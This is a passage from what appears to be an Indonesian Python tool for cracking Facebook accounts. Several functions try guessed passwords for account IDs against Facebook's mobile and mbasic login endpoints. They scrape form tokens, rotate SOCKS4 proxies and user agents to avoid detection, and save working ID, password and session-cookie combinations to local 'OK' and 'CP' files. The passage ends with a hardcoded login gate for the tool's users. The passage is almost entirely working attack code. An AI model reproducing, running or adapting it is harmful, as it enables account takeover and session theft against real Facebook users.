			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=234230510040096&auth_token=6f44efac2a84a51954c3cd229a7e96d5&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fclient_id%3D234230510040096%26redirect_uri%3Dhttps%253A%252F%252Fzapier.com%252Fsso%252Freturn%26scope%3Demail%252Cpublic_profile%26state%3D%2522%257Bsso_provider%253Dfacebook%252Ccode%253DuUb5sVcl69To%257D%2522%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5167628b-4bfc-45fc-9a92-576c8873063b%26tp%3Dunspecified&refsrc=deprecated&app_id=234230510040096&cancel=https%3A%2F%2Fzapier.com%2Fsso%2Freturn%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%2522%257Bsso_provider%253Dfacebook%252Ccode%253DuUb5sVcl69To%257D%2522%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r{P}[{K}DRAGON-CP{P}] : {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{P}[{H}DRAGON-OK{P}] : {H}{idf}|{pw}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{x}[M2] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link= ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			cokz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			cokz+=' m_pixel_ratio=2.625; wd=412x756'
			head={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Not)A;Brand";v="98", "Chromium";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.7,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'com.facebook.katana','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=data,cookies={'cookie': cokz},headers=head,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r{P}[{K}DRAGON-CP{P}] : {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{P}[{H}DRAGON-OK{P}] : {H}{idf}|{pw}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#---------------------[ METHODE-TOUCH-3 ]---------------------#
def bapi(idf,pwv):
	global loop,ok,cp
	ua = random.choice(ugen)
	ses = requests.Session()
	sys.stdout.write(f"\r{x}[M3] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=8730236017046936&kid_directed_site=0&app_id=8730236017046936&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D8730236017046936%26scope%3Demail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Flogin.v-circle.com%252Fsignin-facebook%26state%3DCfDJ8B_ovmE9XgtOjQsptZASQC63Y1n07MyY9reslNGa3nSlfTUKfS-zM3VPiNtYxdSVyt9VwS9FdWkElTZFQYW9U4WkMnbAcYQQ5AjneuKoKRTdaNx6iXddptkuF3UXWCfAkHiKaZ-GYjiaWk8swxq2lijVl78W4cQlTNounsO4TtRQY6JojnYAXZJVujo-0zyD6l0FsEHTy2GP2UA9GrkWkxpAyrlZ_UPn7Lkfle5i4Sn5ee4IVDGjG-9iaz3TTFecVmMqa3TfGuiOqBJtx2ooZqk0zS0VTLJVUbuFlUMOx2SYwYV1W2YVMsbd9COJWBslCCVBSm6_t8R3bKNyiit7k2IL0LVhR5q2gEfkUI9mEX_TFnrZxehpZ9LEUp97l-urADEfcD5iq-M-0TQoOAkqQ5QpvocYJsquoFIopTBS1ZiOHoLI47xBjwthENafPtSrzV1-M_VGNHzdklp7EuJQhBsg0zCsQ2sEIkYJ-z-Yh7QQOuN0RsB2tObdLWjuBhXy-sRg7WtUqwfPvuhqzgogC0XLnVl6peXU-InRXL5gtQ-mQ7JvYrVcoWhmce1r4TvcF1WqlJrX1OmzNxpr9Znz6embDIKeL5pnBBYi8DVcpOe9OMS3lszzPL5Vn2FEqd49wM9O1HQ54srTvzVITLReBdl2-DFsqbZUToqJ0L6uiZP9KcRzDkYvZoZFDObNp6yXq1Wu4V10wNelQMe2AXZ0rtDpT-Iiq3H-tv2P2OBL9yurQiiVqCHq3_AcXTZRgBXhQCv95GyMVu9PzM7P3dOtPyRjkQ3mhLcK--Q-G4uq5oWwSwB8cB7rkXAHofI463gLCYr2z0LII_azu91VQQusp7k%26locale%3Den%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D43217a21-f4c5-4666-9ce1-4402354c7370%26tp%3Dunspecified&cancel_url=https%3A%2F%2Flogin.v-circle.com%2Fsignin-facebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DCfDJ8B_ovmE9XgtOjQsptZASQC63Y1n07MyY9reslNGa3nSlfTUKfS-zM3VPiNtYxdSVyt9VwS9FdWkElTZFQYW9U4WkMnbAcYQQ5AjneuKoKRTdaNx6iXddptkuF3UXWCfAkHiKaZ-GYjiaWk8swxq2lijVl78W4cQlTNounsO4TtRQY6JojnYAXZJVujo-0zyD6l0FsEHTy2GP2UA9GrkWkxpAyrlZ_UPn7Lkfle5i4Sn5ee4IVDGjG-9iaz3TTFecVmMqa3TfGuiOqBJtx2ooZqk0zS0VTLJVUbuFlUMOx2SYwYV1W2YVMsbd9COJWBslCCVBSm6_t8R3bKNyiit7k2IL0LVhR5q2gEfkUI9mEX_TFnrZxehpZ9LEUp97l-urADEfcD5iq-M-0TQoOAkqQ5QpvocYJsquoFIopTBS1ZiOHoLI47xBjwthENafPtSrzV1-M_VGNHzdklp7EuJQhBsg0zCsQ2sEIkYJ-z-Yh7QQOuN0RsB2tObdLWjuBhXy-sRg7WtUqwfPvuhqzgogC0XLnVl6peXU-InRXL5gtQ-mQ7JvYrVcoWhmce1r4TvcF1WqlJrX1OmzNxpr9Znz6embDIKeL5pnBBYi8DVcpOe9OMS3lszzPL5Vn2FEqd49wM9O1HQ54srTvzVITLReBdl2-DFsqbZUToqJ0L6uiZP9KcRzDkYvZoZFDObNp6yXq1Wu4V10wNelQMe2AXZ0rtDpT-Iiq3H-tv2P2OBL9yurQiiVqCHq3_AcXTZRgBXhQCv95GyMVu9PzM7P3dOtPyRjkQ3mhLcK--Q-G4uq5oWwSwB8cB7rkXAHofI463gLCYr2z0LII_azu91VQQusp7k%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1702272755&hrc=1&wtsid=rdr_0gGKx75dIY4slF0Ri&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empity','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=8730236017046936&kid_directed_site=0&app_id=8730236017046936&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D8730236017046936%26scope%3Demail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Flogin.v-circle.com%252Fsignin-facebook%26state%3DCfDJ8B_ovmE9XgtOjQsptZASQC63Y1n07MyY9reslNGa3nSlfTUKfS-zM3VPiNtYxdSVyt9VwS9FdWkElTZFQYW9U4WkMnbAcYQQ5AjneuKoKRTdaNx6iXddptkuF3UXWCfAkHiKaZ-GYjiaWk8swxq2lijVl78W4cQlTNounsO4TtRQY6JojnYAXZJVujo-0zyD6l0FsEHTy2GP2UA9GrkWkxpAyrlZ_UPn7Lkfle5i4Sn5ee4IVDGjG-9iaz3TTFecVmMqa3TfGuiOqBJtx2ooZqk0zS0VTLJVUbuFlUMOx2SYwYV1W2YVMsbd9COJWBslCCVBSm6_t8R3bKNyiit7k2IL0LVhR5q2gEfkUI9mEX_TFnrZxehpZ9LEUp97l-urADEfcD5iq-M-0TQoOAkqQ5QpvocYJsquoFIopTBS1ZiOHoLI47xBjwthENafPtSrzV1-M_VGNHzdklp7EuJQhBsg0zCsQ2sEIkYJ-z-Yh7QQOuN0RsB2tObdLWjuBhXy-sRg7WtUqwfPvuhqzgogC0XLnVl6peXU-InRXL5gtQ-mQ7JvYrVcoWhmce1r4TvcF1WqlJrX1OmzNxpr9Znz6embDIKeL5pnBBYi8DVcpOe9OMS3lszzPL5Vn2FEqd49wM9O1HQ54srTvzVITLReBdl2-DFsqbZUToqJ0L6uiZP9KcRzDkYvZoZFDObNp6yXq1Wu4V10wNelQMe2AXZ0rtDpT-Iiq3H-tv2P2OBL9yurQiiVqCHq3_AcXTZRgBXhQCv95GyMVu9PzM7P3dOtPyRjkQ3mhLcK--Q-G4uq5oWwSwB8cB7rkXAHofI463gLCYr2z0LII_azu91VQQusp7k%26locale%3Den%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D43217a21-f4c5-4666-9ce1-4402354c7370%26tp%3Dunspecified&cancel_url=https%3A%2F%2Flogin.v-circle.com%2Fsignin-facebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DCfDJ8B_ovmE9XgtOjQsptZASQC63Y1n07MyY9reslNGa3nSlfTUKfS-zM3VPiNtYxdSVyt9VwS9FdWkElTZFQYW9U4WkMnbAcYQQ5AjneuKoKRTdaNx6iXddptkuF3UXWCfAkHiKaZ-GYjiaWk8swxq2lijVl78W4cQlTNounsO4TtRQY6JojnYAXZJVujo-0zyD6l0FsEHTy2GP2UA9GrkWkxpAyrlZ_UPn7Lkfle5i4Sn5ee4IVDGjG-9iaz3TTFecVmMqa3TfGuiOqBJtx2ooZqk0zS0VTLJVUbuFlUMOx2SYwYV1W2YVMsbd9COJWBslCCVBSm6_t8R3bKNyiit7k2IL0LVhR5q2gEfkUI9mEX_TFnrZxehpZ9LEUp97l-urADEfcD5iq-M-0TQoOAkqQ5QpvocYJsquoFIopTBS1ZiOHoLI47xBjwthENafPtSrzV1-M_VGNHzdklp7EuJQhBsg0zCsQ2sEIkYJ-z-Yh7QQOuN0RsB2tObdLWjuBhXy-sRg7WtUqwfPvuhqzgogC0XLnVl6peXU-InRXL5gtQ-mQ7JvYrVcoWhmce1r4TvcF1WqlJrX1OmzNxpr9Znz6embDIKeL5pnBBYi8DVcpOe9OMS3lszzPL5Vn2FEqd49wM9O1HQ54srTvzVITLReBdl2-DFsqbZUToqJ0L6uiZP9KcRzDkYvZoZFDObNp6yXq1Wu4V10wNelQMe2AXZ0rtDpT-Iiq3H-tv2P2OBL9yurQiiVqCHq3_AcXTZRgBXhQCv95GyMVu9PzM7P3dOtPyRjkQ3mhLcK--Q-G4uq5oWwSwB8cB7rkXAHofI463gLCYr2z0LII_azu91VQQusp7k%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1702272755&hrc=1&wtsid=rdr_0gGKx75dIY4slF0Ri&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=8730236017046936&auth_token=af4753fd2adfde26187fdcdca1713bbe&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D8730236017046936%26scope%3Demail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Flogin.v-circle.com%252Fsignin-facebook%26state%3DCfDJ8B_ovmE9XgtOjQsptZASQC63Y1n07MyY9reslNGa3nSlfTUKfS-zM3VPiNtYxdSVyt9VwS9FdWkElTZFQYW9U4WkMnbAcYQQ5AjneuKoKRTdaNx6iXddptkuF3UXWCfAkHiKaZ-GYjiaWk8swxq2lijVl78W4cQlTNounsO4TtRQY6JojnYAXZJVujo-0zyD6l0FsEHTy2GP2UA9GrkWkxpAyrlZ_UPn7Lkfle5i4Sn5ee4IVDGjG-9iaz3TTFecVmMqa3TfGuiOqBJtx2ooZqk0zS0VTLJVUbuFlUMOx2SYwYV1W2YVMsbd9COJWBslCCVBSm6_t8R3bKNyiit7k2IL0LVhR5q2gEfkUI9mEX_TFnrZxehpZ9LEUp97l-urADEfcD5iq-M-0TQoOAkqQ5QpvocYJsquoFIopTBS1ZiOHoLI47xBjwthENafPtSrzV1-M_VGNHzdklp7EuJQhBsg0zCsQ2sEIkYJ-z-Yh7QQOuN0RsB2tObdLWjuBhXy-sRg7WtUqwfPvuhqzgogC0XLnVl6peXU-InRXL5gtQ-mQ7JvYrVcoWhmce1r4TvcF1WqlJrX1OmzNxpr9Znz6embDIKeL5pnBBYi8DVcpOe9OMS3lszzPL5Vn2FEqd49wM9O1HQ54srTvzVITLReBdl2-DFsqbZUToqJ0L6uiZP9KcRzDkYvZoZFDObNp6yXq1Wu4V10wNelQMe2AXZ0rtDpT-Iiq3H-tv2P2OBL9yurQiiVqCHq3_AcXTZRgBXhQCv95GyMVu9PzM7P3dOtPyRjkQ3mhLcK--Q-G4uq5oWwSwB8cB7rkXAHofI463gLCYr2z0LII_azu91VQQusp7k%26locale%3Den%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D43217a21-f4c5-4666-9ce1-4402354c7370%26tp%3Dunspecified&refsrc=deprecated&app_id=8730236017046936&cancel=https%3A%2F%2Flogin.v-circle.com%2Fsignin-facebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DCfDJ8B_ovmE9XgtOjQsptZASQC63Y1n07MyY9reslNGa3nSlfTUKfS-zM3VPiNtYxdSVyt9VwS9FdWkElTZFQYW9U4WkMnbAcYQQ5AjneuKoKRTdaNx6iXddptkuF3UXWCfAkHiKaZ-GYjiaWk8swxq2lijVl78W4cQlTNounsO4TtRQY6JojnYAXZJVujo-0zyD6l0FsEHTy2GP2UA9GrkWkxpAyrlZ_UPn7Lkfle5i4Sn5ee4IVDGjG-9iaz3TTFecVmMqa3TfGuiOqBJtx2ooZqk0zS0VTLJVUbuFlUMOx2SYwYV1W2YVMsbd9COJWBslCCVBSm6_t8R3bKNyiit7k2IL0LVhR5q2gEfkUI9mEX_TFnrZxehpZ9LEUp97l-urADEfcD5iq-M-0TQoOAkqQ5QpvocYJsquoFIopTBS1ZiOHoLI47xBjwthENafPtSrzV1-M_VGNHzdklp7EuJQhBsg0zCsQ2sEIkYJ-z-Yh7QQOuN0RsB2tObdLWjuBhXy-sRg7WtUqwfPvuhqzgogC0XLnVl6peXU-InRXL5gtQ-mQ7JvYrVcoWhmce1r4TvcF1WqlJrX1OmzNxpr9Znz6embDIKeL5pnBBYi8DVcpOe9OMS3lszzPL5Vn2FEqd49wM9O1HQ54srTvzVITLReBdl2-DFsqbZUToqJ0L6uiZP9KcRzDkYvZoZFDObNp6yXq1Wu4V10wNelQMe2AXZ0rtDpT-Iiq3H-tv2P2OBL9yurQiiVqCHq3_AcXTZRgBXhQCv95GyMVu9PzM7P3dOtPyRjkQ3mhLcK--Q-G4uq5oWwSwB8cB7rkXAHofI463gLCYr2z0LII_azu91VQQusp7k%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r{P}[{K}SLLOWLY-CP{P}] : {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{P}[{H}SLLOWLY-OK{P}] : {H}{idf}|{pw}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def cuak():
	clear()
	print(f'''____________________ ____ _________________________ .___________    
\______   \______   \    |   \__    ___/\_   _____/ |   \______ \   
 |    |  _/|       _/    |   / |    |    |    __)_  |   ||    |  \  
 |    |   \|    |   \    |  /  |    |    |        \ |   ||    `   \ 
 |______  /|____|_  /______/   |____|   /_______  / |___/_______  / 
        \/        \/                            \/              \/''')
prints(nel(f'{P2} Wellcome User {H2}{pengguna} {P2}Gunakan Script Ini Dengan Bijak{P2}',width=70,padding=(0,7),style=f"{color_panel}"))     
for i in range(10):
	a = "Erna"
	b = "Nazi"
	c = "Sllowly"
	d = "Pantek"
	user=(f'{a}{b}{c}{d}')
for t in range(10):
	a = "BKS2|HZ19|99NM|LSZ1"
	b = "Sllowly"
	c = "botak"
	d = "PLS89" 
	pwas=(f'{a}{b}{c}{d}')
def ngewe():
    try:
        open("passwordmu.txt", "r").read()
    except FileNotFoundError:
        os.system("clear")
        logo()
        prints(nel(f'              {P2}Login Username & Password{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
        print(' [%s1%s] Login Ke Tools'%(H,N))
        print(' [%s2%s] Hubungi Admin'%(H,N))
        pil = input(' %s[%s?%s] Choice : '%(N,K,N))
        if pil =="":
            jalan(f" {N}[{M}×{N}] Sorry, it is wrong...!");time.sleep(1);ngewe()
        elif pil in["2","02"]:
            jalan("\n %s[%s•%s] %sYou will be redirected to the Author Whatsapp..."%(N,H,N,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/6282290885204?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);ngewe()
        elif pil in["1","01"]:
            prints(nel(f'             {P2}Masukan Username Anda{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
        else:
            exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
        pw = input(f"{P}[{M}?{P}] Enter Username : {H}")
        if pw in user:
            jalan(f"{P}[{H}✓{P}]{H} Username Anda Berhasil Didaftarkan");time.sleep(1);kska()
        else:
            jalan(f"\n{P}[{M}!{P}]{M} Maaf Username Tidak Terdaftar");time.sleep(1);ngewe()
    menu()
def kska():
    xx = input(f"{P}[{M}?{P}] Password : {H}")
    loading()
    if xx in[""]:
        jalan(f"{P}[{M}X{P}]{M} Sorry don't be blank!");time.sleep(1);ngewe()
    elif xx in pwas:
        jalan(f"\n{P}[{H}✓{P}]  Selamat Password Anda Berhasil Didaftarkan");time.sleep(3);open("passwordmu.txt", "a").write(xx);menu();cuak()
    else:
        print(f"\n{P}[{M}!{P}] Password Anda Belum Terdaftar");time.sleep(1);ngewe()
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('clear')
	except:pass
	ngewe()
